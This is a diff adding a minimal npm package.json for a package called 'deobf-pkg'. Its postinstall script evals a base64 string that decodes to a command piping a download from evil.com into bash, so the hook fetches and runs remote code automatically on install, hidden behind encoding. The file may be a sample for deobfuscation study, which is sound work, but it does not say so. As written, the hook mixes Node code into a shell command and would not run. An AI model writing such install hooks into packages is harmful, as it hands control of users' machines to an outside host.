@@ -1,0 +1,7 @@
+{
+  "name": "deobf-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "eval(Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20gfCBiYXNo', 'base64').toString())"
+  }
+}
